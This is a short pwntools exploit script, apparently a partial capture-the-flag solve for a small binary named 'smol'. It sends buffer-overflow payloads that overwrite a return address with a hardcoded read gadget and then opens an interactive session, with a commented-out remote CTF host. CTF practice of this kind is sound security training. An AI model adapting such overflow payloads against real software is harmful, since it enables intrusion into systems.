#!/usr/bin/env python
from pwn import *
# context.terminal = ["tmux", "splitw", "-h"]
#p = process("/media/sf_UBUNTU-18/PWNING/bamboofox/babystackbabystack")
binf = ELF("./smol")
#libc=ELF("./libc-2.29.so")

#libc = ELF("libc-2.29.so")
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('smol')

gs = '''
break *0x401042
break *0x40100a
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)

#context.log_level = "DEBUG"

#*******************************************************************************

syscall=0x000000000040100a
read=0x0000000000401023
p=start()
pause()
p.send("A"*8+"B"*8+p64(read))
p.send("D"*100+p64(read))
p.interactive()
